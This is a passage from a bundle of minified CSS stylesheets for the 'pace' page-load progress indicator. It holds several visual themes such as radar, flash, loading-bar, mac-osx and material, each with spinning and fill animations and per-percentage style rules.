.pace-progress{z-index:2000;left:0;top:0;height:6rem}.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;-webkit-perspective:12rem;-moz-perspective:12rem;-ms-perspective:12rem;-o-perspective:12rem;perspective:12rem;position:fixed;width:6rem;margin:auto;right:0;bottom:0}.pace.pace-inactive .pace-progress{display:none}.pace .pace-progress{display:block;position:absolute;width:6rem!important;line-height:6rem;font-size:2rem;border-radius:50%;background:rgba(34,153,221,.8);color:#fff;font-family:\"Helvetica Neue\",sans-serif;font-weight:100;text-align:center;-webkit-animation:pace-theme-center-circle-spin linear infinite 2s;-moz-animation:pace-theme-center-circle-spin linear infinite 2s;-ms-animation:pace-theme-center-circle-spin linear infinite 2s;-o-animation:pace-theme-center-circle-spin linear infinite 2s;animation:pace-theme-center-circle-spin linear infinite 2s;-webkit-transform-style:preserve-3d;-moz-transform-style:preserve-3d;-ms-transform-style:preserve-3d;-o-transform-style:preserve-3d;transform-style:preserve-3d}.pace .pace-progress:after{content:attr(data-progress-text);display:block}@-webkit-keyframes pace-theme-center-circle-spin{from{-webkit-transform:rotateY(0)}to{-webkit-transform:rotateY(360deg)}}@-moz-keyframes pace-theme-center-circle-spin{from{-moz-transform:rotateY(0)}to{-moz-transform:rotateY(360deg)}}@-ms-keyframes pace-theme-center-circle-spin{from{-ms-transform:rotateY(0)}to{-ms-transform:rotateY(360deg)}}@-o-keyframes pace-theme-center-circle-spin{from{-o-transform:rotateY(0)}to{-o-transform:rotateY(360deg)}}@keyframes pace-theme-center-circle-spin{from{transform:rotateY(0)}to{transform:rotateY(360deg)}}"},{"url":"/lib/pace/pace-theme-center-radar.min.css","content":".pace,.pace .pace-activity{z-index:2000;height:90px;width:90px}.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;position:fixed;margin:auto;top:0;left:0;right:0;bottom:0}.pace.pace-inactive .pace-activity{display:none}.pace .pace-activity,.pace .pace-activity:before{position:absolute;display:block;border-color:#29d transparent transparent;border-radius:50%}.pace .pace-activity{left:-30px;top:-30px;border-width:30px;border-style:double;-webkit-animation:spin 1s linear infinite;-moz-animation:spin 1s linear infinite;-o-animation:spin 1s linear infinite;animation:spin 1s linear infinite}.pace .pace-activity:before{content:' ';top:10px;left:10px;height:50px;width:50px;border-width:10px;border-style:solid}@-webkit-keyframes spin{100%{-webkit-transform:rotate(359deg)}}@-moz-keyframes spin{100%{-moz-transform:rotate(359deg)}}@-o-keyframes spin{100%{-moz-transform:rotate(359deg)}}@keyframes spin{100%{transform:rotate(359deg)}}"},{"url":"/lib/pace/pace-theme-center-simple.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;z-index:2000;position:fixed;margin:auto;top:0;left:0;right:0;bottom:0;height:5px;width:200px;background:#fff;border:1px solid #29d;overflow:hidden}.pace .pace-progress{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-ms-box-sizing:border-box;-o-box-sizing:border-box;box-sizing:border-box;-webkit-transform:translate3d(0,0,0);-moz-transform:translate3d(0,0,0);-ms-transform:translate3d(0,0,0);-o-transform:translate3d(0,0,0);transform:translate3d(0,0,0);max-width:200px;z-index:2000;display:block;position:absolute;top:0;right:100%;height:100%;width:100%;background:#29d}.pace.pace-inactive{display:none}"},{"url":"/lib/pace/pace-theme-corner-indicator.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace .pace-activity{display:block;position:fixed;z-index:2000;top:0;right:0;width:300px;height:300px;background:#29d;-webkit-transition:-webkit-transform .3s;transition:transform .3s;-webkit-transform:translateX(100%) translateY(-100%) rotate(45deg);transform:translateX(100%) translateY(-100%) rotate(45deg);pointer-events:none}.pace.pace-active .pace-activity{-webkit-transform:translateX(50%) translateY(-50%) rotate(45deg);transform:translateX(50%) translateY(-50%) rotate(45deg)}.pace .pace-activity::after,.pace .pace-activity::before{-moz-box-sizing:border-box;box-sizing:border-box;position:absolute;bottom:30px;left:50%;display:block;border:5px solid #fff;border-radius:50%;content:''}.pace .pace-activity::before{margin-left:-40px;width:80px;height:80px;border-right-color:rgba(0,0,0,.2);border-left-color:rgba(0,0,0,.2);-webkit-animation:pace-theme-corner-indicator-spin 3s linear infinite;animation:pace-theme-corner-indicator-spin 3s linear infinite}.pace .pace-activity::after{bottom:50px;margin-left:-20px;width:40px;height:40px;border-top-color:rgba(0,0,0,.2);border-bottom-color:rgba(0,0,0,.2);-webkit-animation:pace-theme-corner-indicator-spin 1s linear infinite;animation:pace-theme-corner-indicator-spin 1s linear infinite}@-webkit-keyframes pace-theme-corner-indicator-spin{0%{-webkit-transform:rotate(0)}100%{-webkit-transform:rotate(359deg)}}@keyframes pace-theme-corner-indicator-spin{0%{transform:rotate(0)}100%{transform:rotate(359deg)}}"},{"url":"/lib/pace/pace-theme-fill-left.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background-color:rgba(34,153,221,.19999999999999996);position:fixed;z-index:-1;top:0;right:100%;bottom:0;width:100%}"},{"url":"/lib/pace/pace-theme-flash.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#29d;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}.pace .pace-progress-inner{display:block;position:absolute;right:0;width:100px;height:100%;box-shadow:0 0 10px #29d,0 0 5px #29d;opacity:1;-webkit-transform:rotate(3deg) translate(0,-4px);-moz-transform:rotate(3deg) translate(0,-4px);-ms-transform:rotate(3deg) translate(0,-4px);-o-transform:rotate(3deg) translate(0,-4px);transform:rotate(3deg) translate(0,-4px)}.pace .pace-activity{display:block;position:fixed;z-index:2000;top:15px;right:15px;width:14px;height:14px;border:2px solid transparent;border-top-color:#29d;border-left-color:#29d;border-radius:10px;-webkit-animation:pace-spinner .4s linear infinite;-moz-animation:pace-spinner .4s linear infinite;-ms-animation:pace-spinner .4s linear infinite;-o-animation:pace-spinner .4s linear infinite;animation:pace-spinner .4s linear infinite}@-webkit-keyframes pace-spinner{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@-moz-keyframes pace-spinner{0%{-moz-transform:rotate(0);transform:rotate(0)}100%{-moz-transform:rotate(360deg);transform:rotate(360deg)}}@-o-keyframes pace-spinner{0%{-o-transform:rotate(0);transform:rotate(0)}100%{-o-transform:rotate(360deg);transform:rotate(360deg)}}@-ms-keyframes pace-spinner{0%{-ms-transform:rotate(0);transform:rotate(0)}100%{-ms-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes pace-spinner{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}"},{"url":"/lib/pace/pace-theme-flat-top.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;position:fixed;top:0;left:0;width:100%;-webkit-transform:translate3d(0,-50px,0);-ms-transform:translate3d(0,-50px,0);transform:translate3d(0,-50px,0);-webkit-transition:-webkit-transform .5s ease-out;-ms-transition:-webkit-transform .5s ease-out;transition:transform .5s ease-out}.pace.pace-active{-webkit-transform:translate3d(0,0,0);-ms-transform:translate3d(0,0,0);transform:translate3d(0,0,0)}.pace .pace-progress{display:block;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:10px;background:#29d;pointer-events:none}\n"},{"url":"/lib/pace/pace-theme-loading-bar.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-ms-box-sizing:border-box;-o-box-sizing:border-box;box-sizing:border-box;-webkit-border-radius:10px;-moz-border-radius:10px;border-radius:10px;-webkit-background-clip:padding-box;-moz-background-clip:padding;background-clip:padding-box;z-index:2000;position:fixed;margin:auto;top:12px;left:0;right:0;bottom:0;width:200px;height:50px;overflow:hidden}.pace .pace-progress{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-ms-box-sizing:border-box;-o-box-sizing:border-box;box-sizing:border-box;-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px;-webkit-background-clip:padding-box;-moz-background-clip:padding;-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0);display:block;position:absolute;right:100%;margin-right:-7px;width:93%;top:7px;height:14px;font-size:12px;background:#29d;color:#29d;line-height:60px;font-weight:700;font-family:Helvetica,Arial,\"Lucida Grande\",sans-serif;-webkit-box-shadow:120px 0 #fff,240px 0 #fff;-ms-box-shadow:120px 0 #fff,240px 0 #fff;box-shadow:120px 0 #fff,240px 0 #fff}.pace .pace-progress:after{content:attr(data-progress-text);display:inline-block;position:fixed;width:45px;text-align:right;right:0;padding-right:16px;top:4px}.pace .pace-progress[data-progress-text=\"0%\"]:after{right:-200px}.pace .pace-progress[data-progress-text=\"1%\"]:after{right:-198.14px}.pace .pace-progress[data-progress-text=\"2%\"]:after{right:-196.28px}.pace .pace-progress[data-progress-text=\"3%\"]:after{right:-194.42px}.pace .pace-progress[data-progress-text=\"4%\"]:after{right:-192.56px}.pace .pace-progress[data-progress-text=\"5%\"]:after{right:-190.7px}.pace .pace-progress[data-progress-text=\"6%\"]:after{right:-188.84px}.pace .pace-progress[data-progress-text=\"7%\"]:after{right:-186.98px}.pace .pace-progress[data-progress-text=\"8%\"]:after{right:-185.12px}.pace .pace-progress[data-progress-text=\"9%\"]:after{right:-183.26px}.pace .pace-progress[data-progress-text=\"10%\"]:after{right:-181.4px}.pace .pace-progress[data-progress-text=\"11%\"]:after{right:-179.54px}.pace .pace-progress[data-progress-text=\"12%\"]:after{right:-177.68px}.pace .pace-progress[data-progress-text=\"13%\"]:after{right:-175.82px}.pace .pace-progress[data-progress-text=\"14%\"]:after{right:-173.96px}.pace .pace-progress[data-progress-text=\"15%\"]:after{right:-172.1px}.pace .pace-progress[data-progress-text=\"16%\"]:after{right:-170.24px}.pace .pace-progress[data-progress-text=\"17%\"]:after{right:-168.38px}.pace .pace-progress[data-progress-text=\"18%\"]:after{right:-166.52px}.pace .pace-progress[data-progress-text=\"19%\"]:after{right:-164.66px}.pace .pace-progress[data-progress-text=\"20%\"]:after{right:-162.8px}.pace .pace-progress[data-progress-text=\"21%\"]:after{right:-160.94px}.pace .pace-progress[data-progress-text=\"22%\"]:after{right:-159.08px}.pace .pace-progress[data-progress-text=\"23%\"]:after{right:-157.22px}.pace .pace-progress[data-progress-text=\"24%\"]:after{right:-155.36px}.pace .pace-progress[data-progress-text=\"25%\"]:after{right:-153.5px}.pace .pace-progress[data-progress-text=\"26%\"]:after{right:-151.64px}.pace .pace-progress[data-progress-text=\"27%\"]:after{right:-149.78px}.pace .pace-progress[data-progress-text=\"28%\"]:after{right:-147.92px}.pace .pace-progress[data-progress-text=\"29%\"]:after{right:-146.06px}.pace .pace-progress[data-progress-text=\"30%\"]:after{right:-144.2px}.pace .pace-progress[data-progress-text=\"31%\"]:after{right:-142.34px}.pace .pace-progress[data-progress-text=\"32%\"]:after{right:-140.48px}.pace .pace-progress[data-progress-text=\"33%\"]:after{right:-138.62px}.pace .pace-progress[data-progress-text=\"34%\"]:after{right:-136.76px}.pace .pace-progress[data-progress-text=\"35%\"]:after{right:-134.9px}.pace .pace-progress[data-progress-text=\"36%\"]:after{right:-133.04px}.pace .pace-progress[data-progress-text=\"37%\"]:after{right:-131.18px}.pace .pace-progress[data-progress-text=\"38%\"]:after{right:-129.32px}.pace .pace-progress[data-progress-text=\"39%\"]:after{right:-127.46px}.pace .pace-progress[data-progress-text=\"40%\"]:after{right:-125.6px}.pace .pace-progress[data-progress-text=\"41%\"]:after{right:-123.74px}.pace .pace-progress[data-progress-text=\"42%\"]:after{right:-121.88px}.pace .pace-progress[data-progress-text=\"43%\"]:after{right:-120.02px}.pace .pace-progress[data-progress-text=\"44%\"]:after{right:-118.16px}.pace .pace-progress[data-progress-text=\"45%\"]:after{right:-116.3px}.pace .pace-progress[data-progress-text=\"46%\"]:after{right:-114.44px}.pace .pace-progress[data-progress-text=\"47%\"]:after{right:-112.58px}.pace .pace-progress[data-progress-text=\"48%\"]:after{right:-110.72px}.pace .pace-progress[data-progress-text=\"49%\"]:after{right:-108.86px}.pace .pace-progress[data-progress-text=\"50%\"]:after{right:-107px}.pace .pace-progress[data-progress-text=\"51%\"]:after{right:-105.14px}.pace .pace-progress[data-progress-text=\"52%\"]:after{right:-103.28px}.pace .pace-progress[data-progress-text=\"53%\"]:after{right:-101.42px}.pace .pace-progress[data-progress-text=\"54%\"]:after{right:-99.56px}.pace .pace-progress[data-progress-text=\"55%\"]:after{right:-97.7px}.pace .pace-progress[data-progress-text=\"56%\"]:after{right:-95.84px}.pace .pace-progress[data-progress-text=\"57%\"]:after{right:-93.98px}.pace .pace-progress[data-progress-text=\"58%\"]:after{right:-92.12px}.pace .pace-progress[data-progress-text=\"59%\"]:after{right:-90.26px}.pace .pace-progress[data-progress-text=\"60%\"]:after{right:-88.4px}.pace .pace-progress[data-progress-text=\"61%\"]:after{right:-86.54px}.pace .pace-progress[data-progress-text=\"62%\"]:after{right:-84.68px}.pace .pace-progress[data-progress-text=\"63%\"]:after{right:-82.82px}.pace .pace-progress[data-progress-text=\"64%\"]:after{right:-80.96px}.pace .pace-progress[data-progress-text=\"65%\"]:after{right:-79.1px}.pace .pace-progress[data-progress-text=\"66%\"]:after{right:-77.24px}.pace .pace-progress[data-progress-text=\"67%\"]:after{right:-75.38px}.pace .pace-progress[data-progress-text=\"68%\"]:after{right:-73.52px}.pace .pace-progress[data-progress-text=\"69%\"]:after{right:-71.66px}.pace .pace-progress[data-progress-text=\"70%\"]:after{right:-69.8px}.pace .pace-progress[data-progress-text=\"71%\"]:after{right:-67.94px}.pace .pace-progress[data-progress-text=\"72%\"]:after{right:-66.08px}.pace .pace-progress[data-progress-text=\"73%\"]:after{right:-64.22px}.pace .pace-progress[data-progress-text=\"74%\"]:after{right:-62.36px}.pace .pace-progress[data-progress-text=\"75%\"]:after{right:-60.5px}.pace .pace-progress[data-progress-text=\"76%\"]:after{right:-58.64px}.pace .pace-progress[data-progress-text=\"77%\"]:after{right:-56.78px}.pace .pace-progress[data-progress-text=\"78%\"]:after{right:-54.92px}.pace .pace-progress[data-progress-text=\"79%\"]:after{right:-53.06px}.pace .pace-progress[data-progress-text=\"80%\"]:after{right:-51.2px}.pace .pace-progress[data-progress-text=\"81%\"]:after{right:-49.34px}.pace .pace-progress[data-progress-text=\"82%\"]:after{right:-47.48px}.pace .pace-progress[data-progress-text=\"83%\"]:after{right:-45.62px}.pace .pace-progress[data-progress-text=\"84%\"]:after{right:-43.76px}.pace .pace-progress[data-progress-text=\"85%\"]:after{right:-41.9px}.pace .pace-progress[data-progress-text=\"86%\"]:after{right:-40.04px}.pace .pace-progress[data-progress-text=\"87%\"]:after{right:-38.18px}.pace .pace-progress[data-progress-text=\"88%\"]:after{right:-36.32px}.pace .pace-progress[data-progress-text=\"89%\"]:after{right:-34.46px}.pace .pace-progress[data-progress-text=\"90%\"]:after{right:-32.6px}.pace .pace-progress[data-progress-text=\"91%\"]:after{right:-30.74px}.pace .pace-progress[data-progress-text=\"92%\"]:after{right:-28.88px}.pace .pace-progress[data-progress-text=\"93%\"]:after{right:-27.02px}.pace .pace-progress[data-progress-text=\"94%\"]:after{right:-25.16px}.pace .pace-progress[data-progress-text=\"95%\"]:after{right:-23.3px}.pace .pace-progress[data-progress-text=\"96%\"]:after{right:-21.44px}.pace .pace-progress[data-progress-text=\"97%\"]:after{right:-19.58px}.pace .pace-progress[data-progress-text=\"98%\"]:after{right:-17.72px}.pace .pace-progress[data-progress-text=\"99%\"]:after{right:-15.86px}.pace .pace-progress[data-progress-text=\"100%\"]:after{right:-14px}.pace .pace-activity{position:absolute;width:100%;height:28px;z-index:2001;box-shadow:inset 0 0 0 2px #29d,inset 0 0 0 7px #FFF;border-radius:10px}.pace.pace-inactive{display:none}"},{"url":"/lib/pace/pace-theme-mac-osx.min.css","content":".pace,.pace .pace-progress{width:100%;height:12px;overflow:hidden}.pace,.pace .pace-activity{position:fixed;top:0;left:0}.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;z-index:2000;background:#fff}.pace-inactive{display:none}.pace .pace-progress{background-color:#0087E1;position:fixed;top:0;right:100%;-webkit-border-radius:0 0 4px;-moz-border-radius:0 0 4px;-o-border-radius:0 0 4px;border-radius:0 0 4px;-webkit-box-shadow:inset -1px 0 #00558F,inset 0 -1px #00558F,inset 0 2px rgba(255,255,255,.5),inset 0 6px rgba(255,255,255,.3);-moz-box-shadow:inset -1px 0 #00558F,inset 0 -1px #00558F,inset 0 2px rgba(255,255,255,.5),inset 0 6px rgba(255,255,255,.3);-o-box-shadow:inset -1px 0 #00558F,inset 0 -1px #00558F,inset 0 2px rgba(255,255,255,.5),inset 0 6px rgba(255,255,255,.3);box-shadow:inset -1px 0 #00558F,inset 0 -1px #00558F,inset 0 2px rgba(255,255,255,.5),inset 0 6px rgba(255,255,255,.3)}.pace .pace-activity{right:-28px;bottom:0;-webkit-background-image:radial-gradient(rgba(255,255,255,.65) 0,rgba(255,255,255,.15) 100%);-moz-background-image:radial-gradient(rgba(255,255,255,.65) 0,rgba(255,255,255,.15) 100%);-o-background-image:radial-gradient(rgba(255,255,255,.65) 0,rgba(255,255,255,.15) 100%);background-image:radial-gradient(rgba(255,255,255,.65) 0,rgba(255,255,255,.15) 100%);-webkit-background-size:28px 100%;-moz-background-size:28px 100%;-o-background-size:28px 100%;background-size:28px 100%;-webkit-animation:pace-theme-mac-osx-motion .5s linear infinite;-moz-animation:pace-theme-mac-osx-motion .5s linear infinite;-ms-animation:pace-theme-mac-osx-motion .5s linear infinite;-o-animation:pace-theme-mac-osx-motion .5s linear infinite;animation:pace-theme-mac-osx-motion .5s linear infinite}@-webkit-keyframes pace-theme-mac-osx-motion{0%{-webkit-transform:none;transform:none}100%{-webkit-transform:translate(-28px,0);transform:translate(-28px,0)}}@-moz-keyframes pace-theme-mac-osx-motion{0%{-moz-transform:none;transform:none}100%{-moz-transform:translate(-28px,0);transform:translate(-28px,0)}}@-o-keyframes pace-theme-mac-osx-motion{0%{-o-transform:none;transform:none}100%{-o-transform:translate(-28px,0);transform:translate(-28px,0)}}@-ms-keyframes pace-theme-mac-osx-motion{0%{-ms-transform:none;transform:none}100%{-ms-transform:translate(-28px,0);transform:translate(-28px,0)}}@keyframes pace-theme-mac-osx-motion{0%{transform:none}100%{transform:translate(-28px,0)}}"},{"url":"/lib/pace/pace-theme-material.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;color:#29d}.pace-progress{position:fixed;z-index:2000;top:50%;left:50%;margin-left:-2.5rem;margin-top:-2.5rem;height:5rem;width:5rem;opacity:1;-webkit-transition:opacity .1s;transition:opacity .1s;-webkit-transform:translate3d(0,0,0)!important;-ms-transform:translate3d(0,0,0)!important;transform:translate3d(0,0,0)!important}.pace-inactive .pace-progress,.pace-progress[data-progress=\"00\"]{opacity:0}.pace-progress:after{height:5rem;width:5rem;text-align:center;line-height:5rem;content:attr(data-progress);display:block;font-size:1.8rem;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-weight:300}.pace-progress .pace-progress-inner{overflow:hidden;position:absolute;width:2.5rem;height:5rem;-webkit-transform-origin:left center;-ms-transform-origin:left center;transform-origin:left center;-webkit-transition:-webkit-transform .1s;transition:transform .1s;left:2.5rem;top:0}.pace-progress .pace-progress-inner:after,.pace-progress .pace-progress-inner:before{position:absolute;width:5rem;height:5rem;content:' ';left:-2.5rem;top:0;box-sizing:border-box;border:1px solid;border-radius:5rem}.pace-progress .pace-progress-inner:before{border-right-color:transparent;border-bottom-color:transparent;-webkit-transform:rotate(135deg);-ms-transform:rotate(135deg);transform:rotate(135deg)}.pace-progress .pace-progress-inner:after{border-left-color:transparent;border-top-color:transparent;display:none;-webkit-transform:rotate(315deg);-ms-transform:rotate(315deg);transform:rotate(315deg)}.pace-progress[data-progress=\"00\"] .pace-progress-inner:before{-webkit-transform:rotate(-45deg);-ms-transform:rotate(-45deg);transform:rotate(-45deg)}.pace-progress[data-progress=\"01\"] .pace-progress-inner:before{-webkit-transform:rotate(-41deg);-ms-transform:rotate(-41deg);transform:rotate(-41deg)}.pace-progress[data-progress=\"02\"] .pace-progress-inner:before{-webkit-transform:rotate(-38deg);-ms-transform:rotate(-38deg);transform:rotate(-38deg)}.pace-progress[data-progress=\"03\"] .pace-progress-inner:before{-webkit-transform:rotate(-34deg);-ms-transform:rotate(-34deg);transform:rotate(-34deg)}.pace-progress[data-progress=\"04\"] .pace-progress-inner:before{-webkit-transform:rotate(-31deg);-ms-transform:rotate(-31deg);transform:rotate(-31deg)}.pace-progress[data-progress=\"05\"] .pace-progress-inner:before{-webkit-transform:rotate(-27deg);-ms-transform:rotate(-27deg);transform:rotate(-27deg)}.pace-progress[data-progress=\"06\"] .pace-progress-inner:before{-webkit-transform:rotate(-23deg);-ms-transform:rotate(-23deg);transform:rotate(-23deg)}.pace-progress[data-progress=\"07\"] .pace-progress-inner:before{-webkit-transform:rotate(-20deg);-ms-transform:rotate(-20deg);transform:rotate(-20deg)}.pace-progress[data-progress=\"08\"] .pace-progress-inner:before{-webkit-transform:rotate(-16deg);-ms-transform:rotate(-16deg);transform:rotate(-16deg)}.pace-progress[data-progress=\"09\"] .pace-progress-inner:before{-webkit-transform:rotate(-13deg);-ms-transform:rotate(-13deg);transform:rotate(-13deg)}.pace-progress[data-progress=\"10\"] .pace-progress-inner:before{-webkit-transform:rotate(-9deg);-ms-transform:rotate(-9deg);transform:rotate(-9deg)}.pace-progress[data-progress=\"11\"] .pace-progress-inner:before{-webkit-transform:rotate(-5deg);-ms-transform:rotate(-5deg);transform:rotate(-5deg)}.pace-progress[data-progress=\"12\"] .pace-progress-inner:before{-webkit-transform:rotate(-2deg);-ms-transform:rotate(-2deg);transform:rotate(-2deg)}.pace-progress[data-progress=\"13\"] .pace-progress-inner:before{-webkit-transform:rotate(2deg);-ms-transform:rotate(2deg);transform:rotate(2deg)}.pace-progress[data-progress=\"14\"] .pace-progress-inner:before{-webkit-transform:rotate(5deg);-ms-transform:rotate(5deg);transform:rotate(5deg)}.pace-progress[data-progress=\"15\"] .pace-progress-inner:before{-webkit-transform:rotate(9deg);-ms-transform:rotate(9deg);transform:rotate(9deg)}.pace-progress[data-progress=\"16\"] .pace-progress-inner:before{-webkit-transform:rotate(13deg);-ms-transform:rotate(13deg);transform:rotate(13deg)}.pace-progress[data-progress=\"17\"] .pace-progress-inner:before{-webkit-transform:rotate(16deg);-ms-transform:rotate(16deg);transform:rotate(16deg)}.pace-progress[data-progress=\"18\"] .pace-progress-inner:before{-webkit-transform:rotate(20deg);-ms-transform:rotate(20deg);transform:rotate(20deg)}.pace-progress[data-progress=\"19\"] .pace-progress-inner:before{-webkit-transform:rotate(23deg);-ms-transform:rotate(23deg);transform:rotate(23deg)}.pace-progress[data-progress=\"20\"] .pace-progress-inner:before{-webkit-transform:rotate(27deg);-ms-transform:rotate(27deg);transform:rotate(27deg)}.pace-progress[data-progress=\"21\"] .pace-progress-inner:before{-webkit-transform:rotate(31deg);-ms-transform:rotate(31deg);transform:rotate(31deg)}.pace-progress[data-progress=\"22\"] .pace-progress-inner:before{-webkit-transform:rotate(34deg);-ms-transform:rotate(34deg);transform:rotate(34deg)}.pace-progress[data-progress=\"23\"] .pace-progress-inner:before{-webkit-transform:rotate(38deg);-ms-transform:rotate(38deg);transform:rotate(38deg)}.pace-progress[data-progress=\"24\"] .pace-progress-inner:before{-webkit-transform:rotate(41deg);-ms-transform:rotate(41deg);transform:rotate(41deg)}.pace-progress[data-progress=\"25\"] .pace-progress-inner:before{-webkit-transform:rotate(45deg);-ms-transform:rotate(45deg);transform:rotate(45deg)}.pace-progress[data-progress=\"26\"] .pace-progress-inner:before{-webkit-transform:rotate(49deg);-ms-transform:rotate(49deg);transform:rotate(49deg)}.pace-progress[data-progress=\"27\"] .pace-progress-inner:before{-webkit-transform:rotate(52deg);-ms-transform:rotate(52deg);transform:rotate(52deg)}.pace-progress[data-progress=\"28\"] .pace-progress-inner:before{-webkit-transform:rotate(56deg);-ms-transform:rotate(56deg);transform:rotate(56deg)}.pace-progress[data-progress=\"29\"] .pace-progress-inner:before{-webkit-transform:rotate(59deg);-ms-transform:rotate(59deg);transform:rotate(59deg)}.pace-progress[data-progress=\"30\"] .pace-progress-inner:before{-webkit-transform:rotate(63deg);-ms-transform:rotate(63deg);transform:rotate(63deg)}.pace-progress[data-progress=\"31\"] .pace-progress-inner:before{-webkit-transform:rotate(67deg);-ms-transform:rotate(67deg);transform:rotate(67deg)}.pace-progress[data-progress=\"32\"] .pace-progress-inner:before{-webkit-transform:rotate(70deg);-ms-transform:rotate(70deg);transform:rotate(70deg)}.pace-progress[data-progress=\"33\"] .pace-progress-inner:before{-webkit-transform:rotate(74deg);-ms-transform:rotate(74deg);transform:rotate(74deg)}.pace-progress[data-progress=\"34\"] .pace-progress-inner:before{-webkit-transform:rotate(77deg);-ms-transform:rotate(77deg);transform:rotate(77deg)}.pace-progress[data-progress=\"35\"] .pace-progress-inner:before{-webkit-transform:rotate(81deg);-ms-transform:rotate(81deg);transform:rotate(81deg)}.pace-progress[data-progress=\"36\"] .pace-progress-inner:before{-webkit-transform:rotate(85deg);-ms-transform:rotate(85deg);transform:rotate(85deg)}.pace-progress[data-progress=\"37\"] .pace-progress-inner:before{-webkit-transform:rotate(88deg);-ms-transform:rotate(88deg);transform:rotate(88deg)}.pace-progress[data-progress=\"38\"] .pace-progress-inner:before{-webkit-transform:rotate(92deg);-ms-transform:rotate(92deg);transform:rotate(92deg)}.pace-progress[data-progress=\"39\"] .pace-progress-inner:before{-webkit-transform:rotate(95deg);-ms-transform:rotate(95deg);transform:rotate(95deg)}.pace-progress[data-progress=\"40\"] .pace-progress-inner:before{-webkit-transform:rotate(99deg);-ms-transform:rotate(99deg);transform:rotate(99deg)}.pace-progress[data-progress=\"41\"] .pace-progress-inner:before{-webkit-transform:rotate(103deg);-ms-transform:rotate(103deg);transform:rotate(103deg)}.pace-progress[data-progress=\"42\"] .pace-progress-inner:before{-webkit-transform:rotate(106deg);-ms-transform:rotate(106deg);transform:rotate(106deg)}.pace-progress[data-progress=\"43\"] .pace-progress-inner:before{-webkit-transform:rotate(110deg);-ms-transform:rotate(110deg);transform:rotate(110deg)}.pace-progress[data-progress=\"44\"] .pace-progress-inner:before{-webkit-transform:rotate(113deg);-ms-transform:rotate(113deg);transform:rotate(113deg)}.pace-progress[data-progress=\"45\"] .pace-progress-inner:before{-webkit-transform:rotate(117deg);-ms-transform:rotate(117deg);transform:rotate(117deg)}.pace-progress[data-progress=\"46\"] .pace-progress-inner:before{-webkit-transform:rotate(121deg);-ms-transform:rotate(121deg);transform:rotate(121deg)}.pace-progress[data-progress=\"47\"] .pace-progress-inner:before{-webkit-transform:rotate(124deg);-ms-transform:rotate(124deg);transform:rotate(124deg)}.pace-progress[data-progress=\"48\"] .pace-progress-inner:before{-webkit-transform:rotate(128deg);-ms-transform:rotate(128deg);transform:rotate(128deg)}.pace-progress[data-progress=\"49\"] .pace-progress-inner:before{-webkit-transform:rotate(131deg);-ms-transform:rotate(131deg);transform:rotate(131deg)}.pace-progress[data-progress=\"50\"] .pace-progress-inner:before{-webkit-transform:rotate(135deg);-ms-transform:rotate(135deg);transform:rotate(135deg)}.pace-progress[data-progress=\"50\"] .pace-progress-inner:after{-webkit-transform:rotate(315deg);-ms-transform:rotate(315deg);transform:rotate(315deg);display:block}.pace-progress[data-progress=\"51\"] .pace-progress-inner:after{-webkit-transform:rotate(319deg);-ms-transform:rotate(319deg);transform:rotate(319deg);display:block}.pace-progress[data-progress=\"52\"] .pace-progress-inner:after{-webkit-transform:rotate(322deg);-ms-transform:rotate(322deg);transform:rotate(322deg);display:block}.pace-progress[data-progress=\"53\"] .pace-progress-inner:after{-webkit-transform:rotate(326deg);-ms-transform:rotate(326deg);transform:rotate(326deg);display:block}.pace-progress[data-progress=\"54\"] .pace-progress-inner:after{-webkit-transform:rotate(329deg);-ms-transform:rotate(329deg);transform:rotate(329deg);display:block}.pace-progress[data-progress=\"55\"] .pace-progress-inner:after{-webkit-transform:rotate(333deg);-ms-transform:rotate(333deg);transform:rotate(333deg);display:block}.pace-progress[data-progress=\"56\"] .pace-progress-inner:after{-webkit-transform:rotate(337deg);-ms-transform:rotate(337deg);transform:rotate(337deg);display:block}.pace-progress[data-progress=\"57\"] .pace-progress-inner:after{-webkit-transform:rotate(340deg);-ms-transform:rotate(340deg);transform:rotate(340deg);display:block}.pace-progress[data-progress=\"58\"] .pace-progress-inner:after{-webkit-transform:rotate(344deg);-ms-transform:rotate(344deg);transform:rotate(344deg);display:block}.pace-progress[data-progress=\"59\"] .pace-progress-inner:after{-webkit-transform:rotate(347deg);-ms-transform:rotate(347deg);transform:rotate(347deg);display:block}.pace-progress[data-progress=\"60\"] .pace-progress-inner:after{-webkit-transform:rotate(351deg);-ms-transform:rotate(351deg);transform:rotate(351deg);display:block}.pace-progress[data-progress=\"61\"] .pace-progress-inner:after{-webkit-transform:rotate(355deg);-ms-transform:rotate(355deg);transform:rotate(355deg);display:block}.pace-progress[data-progress=\"62\"] .pace-progress-inner:after{-webkit-transform:rotate(358deg);-ms-transform:rotate(358deg);transform:rotate(358deg);display:block}.pace-progress[data-progress=\"63\"] 